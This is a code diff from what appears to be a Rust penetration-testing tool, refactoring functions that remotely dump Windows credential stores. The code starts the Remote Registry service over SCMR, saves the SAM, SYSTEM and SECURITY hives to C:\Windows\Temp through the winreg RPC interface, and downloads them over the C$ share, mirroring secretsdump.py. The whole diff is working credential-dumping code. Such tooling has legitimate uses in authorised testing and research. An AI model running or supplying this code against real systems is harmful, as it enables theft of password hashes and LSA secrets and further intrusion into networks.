@@ -25,7 +25,7 @@ use netraze_dcerpc::interfaces::{scmr, winreg};
 use super::connection::SmbCredential;
 use super::hive::Hive;
 use super::lsa::{self, LsaDumpResult};
-use super::rpc::{SmbPipeTransport, build_binder, connect_session};
+use super::rpc::{bind_svcctl_over_smb, bind_winreg_over_smb, connect_session};
 use super::sam::{self, SamHash};
 use super::smb2::Smb2Session;
 
@@ -48,15 +48,9 @@ async fn start_remote_registry(
     ipc: u32,
     cred: &SmbCredential,
 ) -> Result<(bool, bool), String> {
-    let pipe = Arc::new(
-        SmbPipeTransport::open(session.clone(), ipc, "svcctl")
-            .map_err(|e| format!("open svcctl pipe: {e}"))?,
-    );
-
-    let binder = build_binder(cred, 0);
-    let mut ch = RpcChannel::bind_authenticated(pipe, scmr::uuid(), (2, 0), binder)
+    let mut ch = bind_svcctl_over_smb(session.clone(), ipc, cred)
         .await
-        .map_err(|e| format!("SCMR bind_authenticated: {e}"))?;
+        .map_err(|e| format!("SCMR bind: {e}"))?;
 
     // 1. Open SCManager
     // Windows SCMR rejects a NULL machine name; Impacket defaults to
@@ -249,24 +243,18 @@ pub async fn dump_sam(
     target: &str,
     cred: &SmbCredential,
 ) -> Result<SamDumpResult, String> {
-    let pipe = match SmbPipeTransport::open(session.clone(), ipc, "winreg") {
-        Ok(p) => Arc::new(p),
-        Err(_e) => {
+    let mut ch = match bind_winreg_over_smb(session.clone(), ipc, cred).await {
+        Ok(c) => c,
+        Err(_) => {
             start_remote_registry(session, ipc, cred).await?;
-            Arc::new(
-                SmbPipeTransport::open(session.clone(), ipc, "winreg")
-                    .map_err(|e2| format!("open winreg pipe (after SCMR start): {e2}"))?,
-            )
+            bind_winreg_over_smb(session.clone(), ipc, cred)
+                .await
+                .map_err(|e| format!("WINREG bind (after SCMR start): {e}"))?
         }
     };
 
-    let binder = build_binder(cred, 0);
-    let mut ch = RpcChannel::bind_authenticated(pipe, winreg::uuid(), (1, 0), binder)
-        .await
-        .map_err(|e| format!("WINREG bind_authenticated: {e}"))?;
-
     // 1. OpenLocalMachine
-    let stub = winreg::encode_open_local_machine_request(winreg::KEY_ALL_ACCESS);
+    let stub = winreg::encode_open_local_machine_request(winreg::MAXIMUM_ALLOWED);
     let resp = ch
         .call(winreg::Opnum::OpenLocalMachine as u16, &stub)
         .await
@@ -280,18 +268,46 @@ pub async fn dump_sam(
         ));
     }
 
-    // 2. Save SAM + SYSTEM hives to temp files on the target.
+    // 2. For each hive: open subkey handle, save, close subkey.
+    //    Write path is relative from the registry service CWD (C:\Windows\System32),
+    //    so "..\\Temp\\xxx" resolves to C:\Windows\Temp\xxx — matching secretsdump.py.
+    //    Download path maps the same location via C$ share.
     let nonce = format!("{:08x}", rand::random::<u32>());
-    let sam_remote = format!("Windows\\Temp\\sam_{nonce}.save");
-    let system_remote = format!("Windows\\Temp\\sys_{nonce}.save");
+    // Paths for BaseRegSaveKey (relative from C:\Windows\System32\)
+    let sam_write = format!("..\\Temp\\sam_{nonce}.tmp");
+    let system_write = format!("..\\Temp\\sys_{nonce}.tmp");
+    // Paths for SMB download (via C$)
+    let sam_remote = format!("Windows\\Temp\\sam_{nonce}.tmp");
+    let system_remote = format!("Windows\\Temp\\sys_{nonce}.tmp");
 
-    let stub_sam = winreg::encode_base_reg_save_key_request(&hklm, &sam_remote);
+    // SAM hive
+    let stub = winreg::encode_base_reg_open_key_request(
+        &hklm,
+        "SAM",
+        winreg::REG_OPTION_NON_VOLATILE,
+        winreg::MAXIMUM_ALLOWED,
+    );
+    let resp = ch
+        .call(winreg::Opnum::BaseRegOpenKey as u16, &stub)
+        .await
+        .map_err(|e| format!("BaseRegOpenKey SAM: {e}"))?;
+    let (sam_key, open_status) = winreg::decode_base_reg_open_key_response(&resp)
+        .map_err(|e| format!("decode BaseRegOpenKey SAM: {e}"))?;
+    if open_status != 0 {
+        let _ = close_reg(&mut ch, &hklm).await;
+        return Err(format!(
+            "BaseRegOpenKey(SAM) failed with status 0x{open_status:08x}"
+        ));
+    }
+
+    let stub_sam = winreg::encode_base_reg_save_key_request(&sam_key, &sam_write);
     let resp_sam = ch
         .call(winreg::Opnum::BaseRegSaveKey as u16, &stub_sam)
         .await
         .map_err(|e| format!("BaseRegSaveKey SAM: {e}"))?;
     let status_sam = winreg::decode_base_reg_save_key_response(&resp_sam)
         .map_err(|e| format!("decode BaseRegSaveKey SAM: {e}"))?;
+    let _ = close_reg(&mut ch, &sam_key).await;
     if status_sam != 0 {
         let _ = close_reg(&mut ch, &hklm).await;
         return Err(format!(
@@ -299,13 +315,34 @@ pub async fn dump_sam(
         ));
     }
 
-    let stub_sys = winreg::encode_base_reg_save_key_request(&hklm, &system_remote);
+    // SYSTEM hive
+    let stub = winreg::encode_base_reg_open_key_request(
+        &hklm,
+        "SYSTEM",
+        winreg::REG_OPTION_NON_VOLATILE,
+        winreg::MAXIMUM_ALLOWED,
+    );
+    let resp = ch
+        .call(winreg::Opnum::BaseRegOpenKey as u16, &stub)
+        .await
+        .map_err(|e| format!("BaseRegOpenKey SYSTEM: {e}"))?;
+    let (sys_key, open_status) = winreg::decode_base_reg_open_key_response(&resp)
+        .map_err(|e| format!("decode BaseRegOpenKey SYSTEM: {e}"))?;
+    if open_status != 0 {
+        let _ = close_reg(&mut ch, &hklm).await;
+        return Err(format!(
+            "BaseRegOpenKey(SYSTEM) failed with status 0x{open_status:08x}"
+        ));
+    }
+
+    let stub_sys = winreg::encode_base_reg_save_key_request(&sys_key, &system_write);
     let resp_sys = ch
         .call(winreg::Opnum::BaseRegSaveKey as u16, &stub_sys)
         .await
         .map_err(|e| format!("BaseRegSaveKey SYSTEM: {e}"))?;
     let status_sys = winreg::decode_base_reg_save_key_response(&resp_sys)
         .map_err(|e| format!("decode BaseRegSaveKey SYSTEM: {e}"))?;
+    let _ = close_reg(&mut ch, &sys_key).await;
     if status_sys != 0 {
         let _ = close_reg(&mut ch, &hklm).await;
         return Err(format!(
@@ -316,7 +353,7 @@ pub async fn dump_sam(
     // 3. Close hklm
     let _ = close_reg(&mut ch, &hklm).await;
 
-    // 4. Download hives via SMB2 on C$
+    // 4. Download hives via SMB2 on C$ (C:\Windows\Temp\ = C$\Windows\Temp\)
     let sam_bytes = {
         let mut s = session
             .lock()
@@ -358,24 +395,18 @@ pub async fn dump_lsa(
     target: &str,
     cred: &SmbCredential,
 ) -> Result<LsaDumpResult, String> {
-    let pipe = match SmbPipeTransport::open(session.clone(), ipc, "winreg") {
-        Ok(p) => Arc::new(p),
-        Err(_e) => {
+    let mut ch = match bind_winreg_over_smb(session.clone(), ipc, cred).await {
+        Ok(c) => c,
+        Err(_) => {
             start_remote_registry(session, ipc, cred).await?;
-            Arc::new(
-                SmbPipeTransport::open(session.clone(), ipc, "winreg")
-                    .map_err(|e2| format!("open winreg pipe (after SCMR start): {e2}"))?,
-            )
+            bind_winreg_over_smb(session.clone(), ipc, cred)
+                .await
+                .map_err(|e| format!("WINREG bind (after SCMR start): {e}"))?
         }
     };
 
-    let binder = build_binder(cred, 0);
-    let mut ch = RpcChannel::bind_authenticated(pipe, winreg::uuid(), (1, 0), binder)
-        .await
-        .map_err(|e| format!("WINREG bind_authenticated: {e}"))?;
-
     // 1. OpenLocalMachine
-    let stub = winreg::encode_open_local_machine_request(winreg::KEY_ALL_ACCESS);
+    let stub = winreg::encode_open_local_machine_request(winreg::MAXIMUM_ALLOWED);
     let resp = ch
         .call(winreg::Opnum::OpenLocalMachine as u16, &stub)
         .await
@@ -389,18 +420,43 @@ pub async fn dump_lsa(
         ));
     }
 
-    // 2. Save SYSTEM + SECURITY hives to temp files on the target.
+    // 2. For each hive: open subkey handle, save, close subkey.
     let nonce = format!("{:08x}", rand::random::<u32>());
-    let system_remote = format!("Windows\\Temp\\sys_{nonce}.save");
-    let security_remote = format!("Windows\\Temp\\sec_{nonce}.save");
+    // Write paths (relative from C:\Windows\System32\ → C:\Windows\Temp\)
+    let system_write = format!("..\\Temp\\sys_{nonce}.tmp");
+    let security_write = format!("..\\Temp\\sec_{nonce}.tmp");
+    // Download paths (via C$)
+    let system_remote = format!("Windows\\Temp\\sys_{nonce}.tmp");
+    let security_remote = format!("Windows\\Temp\\sec_{nonce}.tmp");
 
-    let stub_sys = winreg::encode_base_reg_save_key_request(&hklm, &system_remote);
+    // SYSTEM hive
+    let stub = winreg::encode_base_reg_open_key_request(
+        &hklm,
+        "SYSTEM",
+        winreg::REG_OPTION_NON_VOLATILE,
+        winreg::MAXIMUM_ALLOWED,
+    );
+    let resp = ch
+        .call(winreg::Opnum::BaseRegOpenKey as u16, &stub)
+        .await
+        .map_err(|e| format!("BaseRegOpenKey SYSTEM: {e}"))?;
+    let (sys_key, open_status) = winreg::decode_base_reg_open_key_response(&resp)
+        .map_err(|e| format!("decode BaseRegOpenKey SYSTEM: {e}"))?;
+    if open_status != 0 {
+        let _ = close_reg(&mut ch, &hklm).await;
+        return Err(format!(
+            "BaseRegOpenKey(SYSTEM) failed with status 0x{open_status:08x}"
+        ));
+    }
+
+    let stub_sys = winreg::encode_base_reg_save_key_request(&sys_key, &system_write);
     let resp_sys = ch
         .call(winreg::Opnum::BaseRegSaveKey as u16, &stub_sys)
         .await
         .map_err(|e| format!("BaseRegSaveKey SYSTEM: {e}"))?;
     let status_sys = winreg::decode_base_reg_save_key_response(&resp_sys)
         .map_err(|e| format!("decode BaseRegSaveKey SYSTEM: {e}"))?;
+    let _ = close_reg(&mut ch, &sys_key).await;
     if status_sys != 0 {
         let _ = close_reg(&mut ch, &hklm).await;
         return Err(format!(
@@ -408,13 +464,34 @@ pub async fn dump_lsa(
         ));
     }
 
-    let stub_sec = winreg::encode_base_reg_save_key_request(&hklm, &security_remote);
+    // SECURITY hive
+    let stub = winreg::encode_base_reg_open_key_request(
+        &hklm,
+        "SECURITY",
+        winreg::REG_OPTION_NON_VOLATILE,
+        winreg::MAXIMUM_ALLOWED,
+    );
+    let resp = ch
+        .call(winreg::Opnum::BaseRegOpenKey as u16, &stub)
+        .await
+        .map_err(|e| format!("BaseRegOpenKey SECURITY: {e}"))?;
+    let (sec_key, open_status) = winreg::decode_base_reg_open_key_response(&resp)
+        .map_err(|e| format!("decode BaseRegOpenKey SECURITY: {e}"))?;
+    if open_status != 0 {
+        let _ = close_reg(&mut ch, &hklm).await;
+        return Err(format!(
+            "BaseRegOpenKey(SECURITY) failed with status 0x{open_status:08x}"
+        ));
+    }
+
+    let stub_sec = winreg::encode_base_reg_save_key_request(&sec_key, &security_write);
     let resp_sec = ch
         .call(winreg::Opnum::BaseRegSaveKey as u16, &stub_sec)
         .await
         .map_err(|e| format!("BaseRegSaveKey SECURITY: {e}"))?;
     let status_sec = winreg::decode_base_reg_save_key_response(&resp_sec)
         .map_err(|e| format!("decode BaseRegSaveKey SECURITY: {e}"))?;
+    let _ = close_reg(&mut ch, &sec_key).await;
     if status_sec != 0 {
         let _ = close_reg(&mut ch, &hklm).await;
         return Err(format!(
@@ -425,7 +502,7 @@ pub async fn dump_lsa(
     // 3. Close hklm
     let _ = close_reg(&mut ch, &hklm).await;
 
-    // 4. Download hives via SMB2 on C$
+    // 4. Download hives via SMB2 on C$ (C:\Windows\Temp\ = C$\Windows\Temp\)
     let system_bytes = {
         let mut s = session
             .lock()
@@ -512,17 +589,7 @@ impl RemoteRegistryHandle {
             return;
         }
 
-        let pipe = match SmbPipeTransport::open(session.clone(), ipc, "svcctl") {
-            Ok(p) => Arc::new(p),
-            Err(e) => {
-                eprintln!("WARN: could not open svcctl pipe for cleanup: {e}");
-                return;
-            }
-        };
-
-        let binder = build_binder(cred, 0);
-        let mut ch = match RpcChannel::bind_authenticated(pipe, scmr::uuid(), (2, 0), binder).await
-        {
+        let mut ch = match bind_svcctl_over_smb(session.clone(), ipc, cred).await {
             Ok(c) => c,
             Err(e) => {
                 eprintln!("WARN: SCMR bind for cleanup failed: {e}");
